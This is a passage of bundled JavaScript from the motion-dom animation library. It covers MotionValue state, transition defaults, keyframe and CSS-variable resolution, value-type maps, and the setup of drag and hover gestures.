				if (!this.events.change.getSize()) this.stop();
			});
		};
		return unsubscribe;
	}
	clearListeners() {
		for (const eventManagers in this.events) this.events[eventManagers].clear();
	}
	/**
	* Attaches a passive effect to the `MotionValue`.
	*/
	attach(passiveEffect, stopPassiveEffect) {
		this.passiveEffect = passiveEffect;
		this.stopPassiveEffect = stopPassiveEffect;
	}
	/**
	* Sets the state of the `MotionValue`.
	*
	* @remarks
	*
	* ```jsx
	* const x = useMotionValue(0)
	* x.set(10)
	* ```
	*
	* @param latest - Latest value to set.
	* @param render - Whether to notify render subscribers. Defaults to `true`
	*
	* @public
	*/
	set(v) {
		if (!this.passiveEffect) this.updateAndNotify(v);
		else this.passiveEffect(v, this.updateAndNotify);
	}
	setWithVelocity(prev, current, delta) {
		this.set(current);
		this.prev = void 0;
		this.prevFrameValue = prev;
		this.prevUpdatedAt = this.updatedAt - delta;
	}
	/**
	* Set the state of the `MotionValue`, stopping any active animations,
	* effects, and resets velocity to `0`.
	*/
	jump(v, endAnimation = true) {
		this.updateAndNotify(v);
		this.prev = v;
		this.prevUpdatedAt = this.prevFrameValue = void 0;
		endAnimation && this.stop();
		if (this.stopPassiveEffect) this.stopPassiveEffect();
	}
	dirty() {
		this.events.change?.notify(this.current);
	}
	addDependent(dependent) {
		if (!this.dependents) this.dependents = /* @__PURE__ */ new Set();
		this.dependents.add(dependent);
	}
	removeDependent(dependent) {
		if (this.dependents) this.dependents.delete(dependent);
	}
	/**
	* Returns the latest state of `MotionValue`
	*
	* @returns - The latest state of `MotionValue`
	*
	* @public
	*/
	get() {
		if (collectMotionValues.current) collectMotionValues.current.push(this);
		return this.current;
	}
	/**
	* @public
	*/
	getPrevious() {
		return this.prev;
	}
	/**
	* Returns the latest velocity of `MotionValue`
	*
	* @returns - The latest velocity of `MotionValue`. Returns `0` if the state is non-numerical.
	*
	* @public
	*/
	getVelocity() {
		const currentTime = time.now();
		if (!this.canTrackVelocity || this.prevFrameValue === void 0 || currentTime - this.updatedAt > MAX_VELOCITY_DELTA) return 0;
		const delta = Math.min(this.updatedAt - this.prevUpdatedAt, MAX_VELOCITY_DELTA);
		return /* @__PURE__ */ velocityPerSecond(parseFloat(this.current) - parseFloat(this.prevFrameValue), delta);
	}
	/**
	* Registers a new animation to control this `MotionValue`. Only one
	* animation can drive a `MotionValue` at one time.
	*
	* ```jsx
	* value.start()
	* ```
	*
	* @param animation - A function that starts the provided animation
	*/
	start(startAnimation) {
		this.stop();
		return new Promise((resolve) => {
			this.hasAnimated = true;
			this.animation = startAnimation(resolve);
			if (this.events.animationStart) this.events.animationStart.notify();
		}).then(() => {
			if (this.events.animationComplete) this.events.animationComplete.notify();
			this.clearAnimation();
		});
	}
	/**
	* Stop the currently active animation.
	*
	* @public
	*/
	stop() {
		if (this.animation) {
			this.animation.stop();
			if (this.events.animationCancel) this.events.animationCancel.notify();
		}
		this.clearAnimation();
	}
	/**
	* Returns `true` if this value is currently animating.
	*
	* @public
	*/
	isAnimating() {
		return !!this.animation;
	}
	clearAnimation() {
		delete this.animation;
	}
	/**
	* Destroy and clean up subscribers to this `MotionValue`.
	*
	* The `MotionValue` hooks like `useMotionValue` and `useTransform` automatically
	* handle the lifecycle of the returned `MotionValue`, so this method is only necessary if you've manually
	* created a `MotionValue` via the `motionValue` function.
	*
	* @public
	*/
	destroy() {
		this.dependents?.clear();
		this.events.destroy?.notify();
		this.clearListeners();
		this.stop();
		if (this.stopPassiveEffect) this.stopPassiveEffect();
	}
};
function motionValue(init, options) {
	return new MotionValue(init, options);
}
// node_modules/motion-dom/dist/es/animation/utils/resolve-transition.mjs
/**
* If `transition` has `inherit: true`, shallow-merge it with
* `parentTransition` (child keys win) and strip the `inherit` key.
* Otherwise return `transition` unchanged.
*/
function resolveTransition(transition, parentTransition) {
	if (transition?.inherit && parentTransition) {
		const { inherit: _, ...rest } = transition;
		return {
			...parentTransition,
			...rest
		};
	}
	return transition;
}
// node_modules/motion-dom/dist/es/animation/utils/get-value-transition.mjs
function getValueTransition(transition, key) {
	const valueTransition = transition?.[key] ?? transition?.["default"] ?? transition;
	if (valueTransition !== transition) return resolveTransition(valueTransition, transition);
	return valueTransition;
}
// node_modules/motion-dom/dist/es/animation/utils/default-transitions.mjs
var underDampedSpring = {
	type: "spring",
	stiffness: 500,
	damping: 25,
	restSpeed: 10
};
var criticallyDampedSpring = (target) => ({
	type: "spring",
	stiffness: 550,
	damping: target === 0 ? 2 * Math.sqrt(550) : 30,
	restSpeed: 10
});
var keyframesTransition = {
	type: "keyframes",
	duration: .8
};
/**
* Default easing curve is a slightly shallower version of
* the default browser easing curve.
*/
var ease = {
	type: "keyframes",
	ease: [
		.25,
		.1,
		.35,
		1
	],
	duration: .3
};
var getDefaultTransition = (valueKey, { keyframes }) => {
	if (keyframes.length > 2) return keyframesTransition;
	else if (transformProps.has(valueKey)) return valueKey.startsWith("scale") ? criticallyDampedSpring(keyframes[1]) : underDampedSpring;
	return ease;
};
// node_modules/motion-dom/dist/es/animation/utils/is-transition-defined.mjs
var orchestrationKeys = /* @__PURE__ */ new Set([
	"when",
	"delay",
	"delayChildren",
	"staggerChildren",
	"staggerDirection",
	"repeat",
	"repeatType",
	"repeatDelay",
	"from",
	"elapsed"
]);
/**
* Decide whether a transition is defined on a given Transition.
* This filters out orchestration options and returns true
* if any options are left.
*/
function isTransitionDefined(transition) {
	for (const key in transition) if (!orchestrationKeys.has(key)) return true;
	return false;
}
// node_modules/motion-dom/dist/es/animation/interfaces/motion-value.mjs
var animateMotionValue = (name, value, target, transition = {}, element, isHandoff) => (onComplete) => {
	const valueTransition = getValueTransition(transition, name) || {};
	/**
	* Most transition values are currently completely overwritten by value-specific
	* transitions. In the future it'd be nicer to blend these transitions. But for now
	* delay actually does inherit from the root transition if not value-specific.
	*/
	const delay = valueTransition.delay || transition.delay || 0;
	/**
	* Elapsed isn't a public transition option but can be passed through from
	* optimized appear effects in milliseconds.
	*/
	let { elapsed = 0 } = transition;
	elapsed = elapsed - /* @__PURE__ */ secondsToMilliseconds(delay);
	const options = {
		keyframes: Array.isArray(target) ? target : [null, target],
		ease: "easeOut",
		velocity: value.getVelocity(),
		...valueTransition,
		delay: -elapsed,
		onUpdate: (v) => {
			value.set(v);
			valueTransition.onUpdate && valueTransition.onUpdate(v);
		},
		onComplete: () => {
			onComplete();
			valueTransition.onComplete && valueTransition.onComplete();
		},
		name,
		motionValue: value,
		element: isHandoff ? void 0 : element
	};
	/**
	* If there's no transition defined for this value, we can generate
	* unique transition settings for this value.
	*/
	if (!isTransitionDefined(valueTransition)) Object.assign(options, getDefaultTransition(name, options));
	/**
	* Both WAAPI and our internal animation functions use durations
	* as defined by milliseconds, while our external API defines them
	* as seconds.
	*/
	options.duration && (options.duration = /* @__PURE__ */ secondsToMilliseconds(options.duration));
	options.repeatDelay && (options.repeatDelay = /* @__PURE__ */ secondsToMilliseconds(options.repeatDelay));
	/**
	* Support deprecated way to set initial value. Prefer keyframe syntax.
	*/
	if (options.from !== void 0) options.keyframes[0] = options.from;
	let shouldSkip = false;
	if (options.type === false || options.duration === 0 && !options.repeatDelay) {
		makeAnimationInstant(options);
		if (options.delay === 0) shouldSkip = true;
	}
	if (MotionGlobalConfig.instantAnimations || MotionGlobalConfig.skipAnimations || element?.shouldSkipAnimations || valueTransition.skipAnimations) {
		shouldSkip = true;
		makeAnimationInstant(options);
		options.delay = 0;
	}
	/**
	* If the transition type or easing has been explicitly set by the user
	* then we don't want to allow flattening the animation.
	*/
	options.allowFlatten = !valueTransition.type && !valueTransition.ease;
	/**
	* If we can or must skip creating the animation, and apply only
	* the final keyframe, do so. We also check once keyframes are resolved but
	* this early check prevents the need to create an animation at all.
	*/
	if (shouldSkip && !isHandoff && value.get() !== void 0) {
		const finalKeyframe = getFinalKeyframe(options.keyframes, valueTransition);
		if (finalKeyframe !== void 0) {
			frame.update(() => {
				options.onUpdate(finalKeyframe);
				options.onComplete();
			});
			return;
		}
	}
	return valueTransition.isSync ? new JSAnimation(options) : new AsyncMotionValueAnimation(options);
};
// node_modules/motion-dom/dist/es/animation/utils/css-variables-conversion.mjs
/**
* Parse Framer's special CSS variable format into a CSS token and a fallback.
*
* ```
* `var(--foo, #fff)` => [`--foo`, '#fff']
* ```
*
* @param current
*/
var splitCSSVariableRegex = /^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;
function parseCSSVariable(current) {
	const match = splitCSSVariableRegex.exec(current);
	if (!match) return [,];
	const [, token1, token2, fallback] = match;
	return [`--${token1 ?? token2}`, fallback];
}
function getVariableValue(current, element, depth = 1) {
	`${current}`;
	const [token, fallback] = parseCSSVariable(current);
	if (!token) return;
	const resolved = window.getComputedStyle(element).getPropertyValue(token);
	if (resolved) {
		const trimmed = resolved.trim();
		return isNumericalString(trimmed) ? parseFloat(trimmed) : trimmed;
	}
	return isCSSVariableToken(fallback) ? getVariableValue(fallback, element, depth + 1) : fallback;
}
// node_modules/motion-dom/dist/es/render/utils/resolve-variants.mjs
function getValueState(visualElement) {
	const state = [{}, {}];
	visualElement?.values.forEach((value, key) => {
		state[0][key] = value.get();
		state[1][key] = value.getVelocity();
	});
	return state;
}
function resolveVariantFromProps(props, definition, custom, visualElement) {
	/**
	* If the variant definition is a function, resolve.
	*/
	if (typeof definition === "function") {
		const [current, velocity] = getValueState(visualElement);
		definition = definition(custom !== void 0 ? custom : props.custom, current, velocity);
	}
	/**
	* If the variant definition is a variant label, or
	* the function returned a variant label, resolve.
	*/
	if (typeof definition === "string") definition = props.variants && props.variants[definition];
	/**
	* At this point we've resolved both functions and variant labels,
	* but the resolved variant label might itself have been a function.
	* If so, resolve. This can only have returned a valid target object.
	*/
	if (typeof definition === "function") {
		const [current, velocity] = getValueState(visualElement);
		definition = definition(custom !== void 0 ? custom : props.custom, current, velocity);
	}
	return definition;
}
// node_modules/motion-dom/dist/es/render/utils/resolve-dynamic-variants.mjs
function resolveVariant(visualElement, definition, custom) {
	const props = visualElement.getProps();
	return resolveVariantFromProps(props, definition, custom !== void 0 ? custom : props.custom, visualElement);
}
// node_modules/motion-dom/dist/es/render/utils/keys-position.mjs
var positionalKeys = /* @__PURE__ */ new Set([
	"width",
	"height",
	"top",
	"left",
	"right",
	"bottom",
	...transformPropOrder
]);
// node_modules/motion-dom/dist/es/render/utils/is-keyframes-target.mjs
var isKeyframesTarget = (v) => {
	return Array.isArray(v);
};
// node_modules/motion-dom/dist/es/render/utils/setters.mjs
/**
* Set VisualElement's MotionValue, creating a new MotionValue for it if
* it doesn't exist.
*/
function setMotionValue(visualElement, key, value) {
	if (visualElement.hasValue(key)) visualElement.getValue(key).set(value);
	else visualElement.addValue(key, motionValue(value));
}
function resolveFinalValueInKeyframes(v) {
	return isKeyframesTarget(v) ? v[v.length - 1] || 0 : v;
}
function setTarget(visualElement, definition) {
	let { transitionEnd = {}, transition = {}, ...target } = resolveVariant(visualElement, definition) || {};
	target = {
		...target,
		...transitionEnd
	};
	for (const key in target) setMotionValue(visualElement, key, resolveFinalValueInKeyframes(target[key]));
}
// node_modules/motion-dom/dist/es/value/utils/is-motion-value.mjs
var isMotionValue = (value) => Boolean(value && value.getVelocity);
// node_modules/motion-dom/dist/es/value/will-change/is.mjs
function isWillChangeMotionValue(value) {
	return Boolean(isMotionValue(value) && value.add);
}
// node_modules/motion-dom/dist/es/value/will-change/add-will-change.mjs
function addValueToWillChange(visualElement, key) {
	const willChange = visualElement.getValue("willChange");
	/**
	* It could be that a user has set willChange to a regular MotionValue,
	* in which case we can't add the value to it.
	*/
	if (isWillChangeMotionValue(willChange)) return willChange.add(key);
	else if (!willChange && MotionGlobalConfig.WillChange) {
		const newWillChange = new MotionGlobalConfig.WillChange("auto");
		visualElement.addValue("willChange", newWillChange);
		newWillChange.add(key);
	}
}
// node_modules/motion-dom/dist/es/render/dom/utils/camel-to-dash.mjs
function camelToDash(str) {
	return str.replace(/([A-Z])/g, (match) => `-${match.toLowerCase()}`);
}
var optimizedAppearDataAttribute = "data-" + camelToDash("framerAppearId");
// node_modules/motion-dom/dist/es/animation/optimized-appear/get-appear-id.mjs
function getOptimisedAppearId(visualElement) {
	return visualElement.props[optimizedAppearDataAttribute];
}
// node_modules/motion-dom/dist/es/animation/interfaces/visual-element-target.mjs
/**
* Decide whether we should block this animation. Previously, we achieved this
* just by checking whether the key was listed in protectedKeys, but this
* posed problems if an animation was triggered by afterChildren and protectedKeys
* had been set to true in the meantime.
*/
function shouldBlockAnimation({ protectedKeys, needsAnimating }, key) {
	const shouldBlock = protectedKeys.hasOwnProperty(key) && needsAnimating[key] !== true;
	needsAnimating[key] = false;
	return shouldBlock;
}
function animateTarget(visualElement, targetAndTransition, { delay = 0, transitionOverride, type } = {}) {
	let { transition, transitionEnd, ...target } = targetAndTransition;
	const defaultTransition = visualElement.getDefaultTransition();
	transition = transition ? resolveTransition(transition, defaultTransition) : defaultTransition;
	const reduceMotion = transition?.reduceMotion;
	const skipAnimations = transition?.skipAnimations;
	if (transitionOverride) transition = transitionOverride;
	const animations = [];
	const animationTypeState = type && visualElement.animationState && visualElement.animationState.getState()[type];
	const path = transition?.path;
	if (path) path.animateVisualElement(visualElement, target, transition, delay, animations);
	for (const key in target) {
		const value = visualElement.getValue(key, visualElement.latestValues[key] ?? null);
		const valueTarget = target[key];
		if (valueTarget === void 0 || animationTypeState && shouldBlockAnimation(animationTypeState, key)) continue;
		const valueTransition = {
			delay,
			...getValueTransition(transition || {}, key)
		};
		if (skipAnimations) valueTransition.skipAnimations = true;
		/**
		* If the value is already at the defined target, skip the animation.
		* We still re-assert the value via frame.update to take precedence
		* over any stale transitionEnd callbacks from previous animations.
		*/
		const currentValue = value.get();
		if (currentValue !== void 0 && !value.isAnimating() && !Array.isArray(valueTarget) && valueTarget === currentValue && !valueTransition.velocity) {
			frame.update(() => value.set(valueTarget));
			continue;
		}
		/**
		* If this is the first time a value is being animated, check
		* to see if we're handling off from an existing animation.
		*/
		let isHandoff = false;
		if (window.MotionHandoffAnimation) {
			const appearId = getOptimisedAppearId(visualElement);
			if (appearId) {
				const startTime = window.MotionHandoffAnimation(appearId, key, frame);
				if (startTime !== null) {
					valueTransition.startTime = startTime;
					isHandoff = true;
				}
			}
		}
		addValueToWillChange(visualElement, key);
		const shouldReduceMotion = reduceMotion ?? visualElement.shouldReduceMotion;
		value.start(animateMotionValue(key, value, valueTarget, shouldReduceMotion && positionalKeys.has(key) ? { type: false } : valueTransition, visualElement, isHandoff));
		const animation = value.animation;
		if (animation) animations.push(animation);
	}
	if (transitionEnd) {
		const applyTransitionEnd = () => frame.update(() => {
			transitionEnd && setTarget(visualElement, transitionEnd);
		});
		if (animations.length) Promise.all(animations).then(applyTransitionEnd);
		else applyTransitionEnd();
	}
	return animations;
}
// node_modules/motion-dom/dist/es/animation/interfaces/visual-element-variant.mjs
function animateVariant(visualElement, variant, options = {}) {
	const resolved = resolveVariant(visualElement, variant, options.type === "exit" ? visualElement.presenceContext?.custom : void 0);
	let { transition = visualElement.getDefaultTransition() || {} } = resolved || {};
	if (options.transitionOverride) transition = options.transitionOverride;
	/**
	* If we have a variant, create a callback that runs it as an animation.
	* Otherwise, we resolve a Promise immediately for a composable no-op.
	*/
	const getAnimation = resolved ? () => Promise.all(animateTarget(visualElement, resolved, options)) : () => Promise.resolve();
	/**
	* If we have children, create a callback that runs all their animations.
	* Otherwise, we resolve a Promise immediately for a composable no-op.
	*/
	const getChildAnimations = visualElement.variantChildren && visualElement.variantChildren.size ? (forwardDelay = 0) => {
		const { delayChildren = 0, staggerChildren, staggerDirection } = transition;
		return animateChildren(visualElement, variant, forwardDelay, delayChildren, staggerChildren, staggerDirection, options);
	} : () => Promise.resolve();
	/**
	* If the transition explicitly defines a "when" option, we need to resolve either
	* this animation or all children animations before playing the other.
	*/
	const { when } = transition;
	if (when) {
		const [first, last] = when === "beforeChildren" ? [getAnimation, getChildAnimations] : [getChildAnimations, getAnimation];
		return first().then(() => last());
	} else return Promise.all([getAnimation(), getChildAnimations(options.delay)]);
}
function animateChildren(visualElement, variant, delay = 0, delayChildren = 0, staggerChildren = 0, staggerDirection = 1, options) {
	const animations = [];
	for (const child of visualElement.variantChildren) {
		child.notify("AnimationStart", variant);
		animations.push(animateVariant(child, variant, {
			...options,
			delay: delay + (typeof delayChildren === "function" ? 0 : delayChildren) + calcChildStagger(visualElement.variantChildren, child, delayChildren, staggerChildren, staggerDirection)
		}).then(() => child.notify("AnimationComplete", variant)));
	}
	return Promise.all(animations);
}
// node_modules/motion-dom/dist/es/animation/interfaces/visual-element.mjs
function animateVisualElement(visualElement, definition, options = {}) {
	visualElement.notify("AnimationStart", definition);
	let animation;
	if (Array.isArray(definition)) {
		const animations = definition.map((variant) => animateVariant(visualElement, variant, options));
		animation = Promise.all(animations);
	} else if (typeof definition === "string") animation = animateVariant(visualElement, definition, options);
	else {
		const resolvedDefinition = typeof definition === "function" ? resolveVariant(visualElement, definition, options.custom) : definition;
		animation = Promise.all(animateTarget(visualElement, resolvedDefinition, options));
	}
	return animation.then(() => {
		visualElement.notify("AnimationComplete", definition);
	});
}
// node_modules/motion-dom/dist/es/value/types/auto.mjs
/**
* ValueType for "auto"
*/
var auto = {
	test: (v) => v === "auto",
	parse: (v) => v
};
// node_modules/motion-dom/dist/es/value/types/test.mjs
/**
* Tests a provided value against a ValueType
*/
var testValueType = (v) => (type) => type.test(v);
// node_modules/motion-dom/dist/es/value/types/dimensions.mjs
/**
* A list of value types commonly used for dimensions
*/
var dimensionValueTypes = [
	number,
	px,
	percent,
	degrees,
	vw,
	vh,
	auto
];
/**
* Tests a dimensional value against the list of dimension ValueTypes
*/
var findDimensionValueType = (v) => dimensionValueTypes.find(testValueType(v));
// node_modules/motion-dom/dist/es/animation/keyframes/utils/is-none.mjs
function isNone(value) {
	if (typeof value === "number") return value === 0;
	else if (value !== null) return value === "none" || value === "0" || isZeroValueString(value);
	else return true;
}
// node_modules/motion-dom/dist/es/value/types/complex/filter.mjs
/**
* Properties that should default to 1 or 100%
*/
var maxDefaults = /* @__PURE__ */ new Set([
	"brightness",
	"contrast",
	"saturate",
	"opacity"
]);
function applyDefaultFilter(v) {
	const [name, value] = v.slice(0, -1).split("(");
	if (name === "drop-shadow") return v;
	const [number] = value.match(floatRegex) || [];
	if (!number) return v;
	const unit = value.replace(number, "");
	let defaultValue = maxDefaults.has(name) ? 1 : 0;
	if (number !== value) defaultValue *= 100;
	return name + "(" + defaultValue + unit + ")";
}
var functionRegex = /\b([a-z-]*)\(.*?\)/gu;
var filter = {
	...complex,
	getAnimatableNone: (v) => {
		const functions = v.match(functionRegex);
		return functions ? functions.map(applyDefaultFilter).join(" ") : v;
	}
};
// node_modules/motion-dom/dist/es/value/types/complex/mask.mjs
var mask = {
	...complex,
	getAnimatableNone: (v) => {
		const parsed = complex.parse(v);
		return complex.createTransformer(v)(parsed.map((v) => typeof v === "number" ? 0 : typeof v === "object" ? {
			...v,
			alpha: 1
		} : v));
	}
};
// node_modules/motion-dom/dist/es/value/types/int.mjs
var int = {
	...number,
	transform: Math.round
};
// node_modules/motion-dom/dist/es/value/types/maps/number.mjs
var numberValueTypes = {
	borderWidth: px,
	borderTopWidth: px,
	borderRightWidth: px,
	borderBottomWidth: px,
	borderLeftWidth: px,
	borderRadius: px,
	borderTopLeftRadius: px,
	borderTopRightRadius: px,
	borderBottomRightRadius: px,
	borderBottomLeftRadius: px,
	width: px,
	maxWidth: px,
	height: px,
	maxHeight: px,
	top: px,
	right: px,
	bottom: px,
	left: px,
	inset: px,
	insetBlock: px,
	insetBlockStart: px,
	insetBlockEnd: px,
	insetInline: px,
	insetInlineStart: px,
	insetInlineEnd: px,
	padding: px,
	paddingTop: px,
	paddingRight: px,
	paddingBottom: px,
	paddingLeft: px,
	paddingBlock: px,
	paddingBlockStart: px,
	paddingBlockEnd: px,
	paddingInline: px,
	paddingInlineStart: px,
	paddingInlineEnd: px,
	margin: px,
	marginTop: px,
	marginRight: px,
	marginBottom: px,
	marginLeft: px,
	marginBlock: px,
	marginBlockStart: px,
	marginBlockEnd: px,
	marginInline: px,
	marginInlineStart: px,
	marginInlineEnd: px,
	fontSize: px,
	backgroundPositionX: px,
	backgroundPositionY: px,
	rotate: degrees,
	/**
	* Internal channel for `transition.path` orientToPath. Composed onto
	* `rotate` at the transform-build sites so the user's `rotate` is
	* never read or overwritten. Not part of `transformPropOrder`.
	*/
	pathRotation: degrees,
	rotateX: degrees,
	rotateY: degrees,
	rotateZ: degrees,
	scale,
	scaleX: scale,
	scaleY: scale,
	scaleZ: scale,
	skew: degrees,
	skewX: degrees,
	skewY: degrees,
	distance: px,
	translateX: px,
	translateY: px,
	translateZ: px,
	x: px,
	y: px,
	z: px,
	perspective: px,
	transformPerspective: px,
	opacity: alpha,
	originX: progressPercentage,
	originY: progressPercentage,
	originZ: px,
	zIndex: int,
	fillOpacity: alpha,
	strokeOpacity: alpha,
	numOctaves: int
};
// node_modules/motion-dom/dist/es/value/types/maps/defaults.mjs
/**
* A map of default value types for common values
*/
var defaultValueTypes = {
	...numberValueTypes,
	color,
	backgroundColor: color,
	outlineColor: color,
	fill: color,
	stroke: color,
	borderColor: color,
	borderTopColor: color,
	borderRightColor: color,
	borderBottomColor: color,
	borderLeftColor: color,
	filter,
	WebkitFilter: filter,
	mask,
	WebkitMask: mask
};
/**
* Gets the default ValueType for the provided value key
*/
var getDefaultValueType = (key) => defaultValueTypes[key];
// node_modules/motion-dom/dist/es/value/types/utils/animatable-none.mjs
var customTypes = /*@__PURE__*/ new Set([filter, mask]);
function getAnimatableNone(key, value) {
	let defaultValueType = getDefaultValueType(key);
	if (!customTypes.has(defaultValueType)) defaultValueType = complex;
	return defaultValueType.getAnimatableNone ? defaultValueType.getAnimatableNone(value) : void 0;
}
// node_modules/motion-dom/dist/es/animation/keyframes/utils/make-none-animatable.mjs
/**
* If we encounter keyframes like "none" or "0" and we also have keyframes like
* "#fff" or "200px 200px" we want to find a keyframe to serve as a template for
* the "none" keyframes. In this case "#fff" or "200px 200px" - then these get turned into
* zero equivalents, i.e. "#fff0" or "0px 0px".
*/
var invalidTemplates = /* @__PURE__ */ new Set([
	"auto",
	"none",
	"0"
]);
function makeNoneKeyframesAnimatable(unresolvedKeyframes, noneKeyframeIndexes, name) {
	let i = 0;
	let animatableTemplate = void 0;
	while (i < unresolvedKeyframes.length && !animatableTemplate) {
		const keyframe = unresolvedKeyframes[i];
		if (typeof keyframe === "string" && !invalidTemplates.has(keyframe) && analyseComplexValue(keyframe).values.length) animatableTemplate = unresolvedKeyframes[i];
		i++;
	}
	if (animatableTemplate && name) for (const noneIndex of noneKeyframeIndexes) unresolvedKeyframes[noneIndex] = getAnimatableNone(name, animatableTemplate);
}
// node_modules/motion-dom/dist/es/animation/keyframes/DOMKeyframesResolver.mjs
var DOMKeyframesResolver = class extends KeyframeResolver {
	constructor(unresolvedKeyframes, onComplete, name, motionValue, element) {
		super(unresolvedKeyframes, onComplete, name, motionValue, element, true);
	}
	readKeyframes() {
		const { unresolvedKeyframes, element, name } = this;
		if (!element || !element.current) return;
		super.readKeyframes();
		/**
		* If any keyframe is a CSS variable, we need to find its value by sampling the element
		*/
		for (let i = 0; i < unresolvedKeyframes.length; i++) {
			let keyframe = unresolvedKeyframes[i];
			if (typeof keyframe === "string") {
				keyframe = keyframe.trim();
				if (isCSSVariableToken(keyframe)) {
					const resolved = getVariableValue(keyframe, element.current);
					if (resolved !== void 0) unresolvedKeyframes[i] = resolved;
					if (i === unresolvedKeyframes.length - 1) this.finalKeyframe = keyframe;
				}
			}
		}
		/**
		* Resolve "none" values. We do this potentially twice - once before and once after measuring keyframes.
		* This could be seen as inefficient but it's a trade-off to avoid measurements in more situations, which
		* have a far bigger performance impact.
		*/
		this.resolveNoneKeyframes();
		/**
		* Check to see if unit type has changed. If so schedule jobs that will
		* temporarily set styles to the destination keyframes.
		* Skip if we have more than two keyframes or this isn't a positional value.
		* TODO: We can throw if there are multiple keyframes and the value type changes.
		*/
		if (!positionalKeys.has(name) || unresolvedKeyframes.length !== 2) return;
		const [origin, target] = unresolvedKeyframes;
		const originType = findDimensionValueType(origin);
		const targetType = findDimensionValueType(target);
		if (containsCSSVariable(origin) !== containsCSSVariable(target) && positionalValues[name]) {
			this.needsMeasurement = true;
			return;
		}
		/**
		* Either we don't recognise these value types or we can animate between them.
		*/
		if (originType === targetType) return;
		/**
		* If both values are numbers or pixels, we can animate between them by
		* converting them to numbers.
		*/
		if (isNumOrPxType(originType) && isNumOrPxType(targetType)) for (let i = 0; i < unresolvedKeyframes.length; i++) {
			const value = unresolvedKeyframes[i];
			if (typeof value === "string") unresolvedKeyframes[i] = parseFloat(value);
		}
		else if (positionalValues[name])
 /**
		* Else, the only way to resolve this is by measuring the element.
		*/
		this.needsMeasurement = true;
	}
	resolveNoneKeyframes() {
		const { unresolvedKeyframes, name } = this;
		const noneKeyframeIndexes = [];
		for (let i = 0; i < unresolvedKeyframes.length; i++) if (unresolvedKeyframes[i] === null || isNone(unresolvedKeyframes[i])) noneKeyframeIndexes.push(i);
		if (noneKeyframeIndexes.length) makeNoneKeyframesAnimatable(unresolvedKeyframes, noneKeyframeIndexes, name);
	}
	measureInitialState() {
		const { element, unresolvedKeyframes, name } = this;
		if (!element || !element.current) return;
		if (name === "height") this.suspendedScrollY = window.pageYOffset;
		this.measuredOrigin = positionalValues[name](element.measureViewportBox(), window.getComputedStyle(element.current));
		unresolvedKeyframes[0] = this.measuredOrigin;
		const measureKeyframe = unresolvedKeyframes[unresolvedKeyframes.length - 1];
		if (measureKeyframe !== void 0) element.getValue(name, measureKeyframe).jump(measureKeyframe, false);
	}
	measureEndState() {
		const { element, name, unresolvedKeyframes } = this;
		if (!element || !element.current) return;
		const value = element.getValue(name);
		value && value.jump(this.measuredOrigin, false);
		const finalKeyframeIndex = unresolvedKeyframes.length - 1;
		const finalKeyframe = unresolvedKeyframes[finalKeyframeIndex];
		unresolvedKeyframes[finalKeyframeIndex] = positionalValues[name](element.measureViewportBox(), window.getComputedStyle(element.current));
		if (finalKeyframe !== null && this.finalKeyframe === void 0) this.finalKeyframe = finalKeyframe;
		if (this.removedTransforms?.length) this.removedTransforms.forEach(([unsetTransformName, unsetTransformValue]) => {
			element.getValue(unsetTransformName).set(unsetTransformValue);
		});
		this.resolveNoneKeyframes();
	}
};
// node_modules/motion-dom/dist/es/utils/border-radius.mjs
/**
* The four corner-radius longhands. Shared so the projection mixer, scale
* corrector, WAAPI px-value set and view-transition crop pass don't each carry
* their own copy. Order is irrelevant - every consumer mixes/corrects/animates
* each corner independently.
*/
var cornerRadiusProps = [
	"borderTopLeftRadius",
	"borderTopRightRadius",
	"borderBottomRightRadius",
	"borderBottomLeftRadius"
];
// node_modules/motion-dom/dist/es/utils/resolve-elements.mjs
function resolveElements(elementOrSelector, scope, selectorCache) {
	if (elementOrSelector == null) return [];
	if (elementOrSelector instanceof EventTarget) return [elementOrSelector];
	else if (typeof elementOrSelector === "string") {
		let root = document;
		if (scope) root = scope.current;
		const elements = selectorCache?.[elementOrSelector] ?? root.querySelectorAll(elementOrSelector);
		return elements ? Array.from(elements) : [];
	}
	return Array.from(elementOrSelector).filter((element) => element != null);
}
// node_modules/motion-dom/dist/es/value/types/utils/get-as-type.mjs
/**
* Provided a value and a ValueType, returns the value as that value type.
*/
var getValueAsType = (value, type) => {
	return type && typeof value === "number" ? type.transform(value) : value;
};
// node_modules/motion-dom/dist/es/utils/is-html-element.mjs
/**
* Checks if an element is an HTML element in a way
* that works across iframes
*/
function isHTMLElement(element) {
	return isObject(element) && "offsetHeight" in element && !("ownerSVGElement" in element);
}
// node_modules/motion-dom/dist/es/frameloop/microtask.mjs
var { schedule: microtask, cancel: cancelMicrotask } = /* @__PURE__ */ createRenderBatcher(queueMicrotask, false);
// node_modules/motion-dom/dist/es/gestures/drag/state/is-active.mjs
var isDragging = {
	x: false,
	y: false
};
function isDragActive() {
	return isDragging.x || isDragging.y;
}
// node_modules/motion-dom/dist/es/gestures/drag/state/set-active.mjs
function setDragLock(axis) {
	if (axis === "x" || axis === "y") {
		if (isDragging[axis]) return null;
		else {
			isDragging[axis] = true;
			return () => {
				isDragging[axis] = false;
			};
		}
	} else if (isDragging.x || isDragging.y) return null;
	else {
		isDragging.x = isDragging.y = true;
		return () => {
			isDragging.x = isDragging.y = false;
		};
	}
}
// node_modules/motion-dom/dist/es/gestures/utils/setup.mjs
function setupGesture(elementOrSelector, options) {
	const elements = resolveElements(elementOrSelector);
	const gestureAbortController = new AbortController();
	const eventOptions = {
		passive: true,
		...options,
		signal: gestureAbortController.signal
	};
	const cancel = () => gestureAbortController.abort();
	return [
		elements,
		eventOptions,
		cancel
	];
}
// node_modules/motion-dom/dist/es/gestures/hover.mjs
function isValidHover(event) {
	return !(event.pointerType === "touch" || isDragActive());
}
/**
* Create a hover gesture. hover() is different to .addEventListener("pointerenter")
* in that it has an easier syntax, filters out polyfilled touch events, interoperates
* with drag gestures, and automatically removes the "pointerennd" event listener when the hover ends.
*
* @public
*/
function hover(elementOrSelector, onHoverStart, options = {}) {
	const [elements, eventOptions, cancel] = setupGesture(elementOrSelector, options);
	elements.forEach((element) => {
		let isPressed = false;
		let deferredHoverEnd = false;
		let hoverEndCallback;
		const removePointerLeave = () => {
			element.removeEventListener("pointerleave", onPointerLeave);
		};
		const endHover = (event) => {
			if (hoverEndCallback) {
				hoverEndCallback(event);
				hoverEndCallback = void 0;
			}
			removePointerLeave();
		};
		const onPointerUp = (event) => {
			isPressed = false;
			window.removeEventListener("pointerup", onPointerUp);
			window.removeEventListener("pointercancel", onPointerUp);
			if (deferredHoverEnd) {
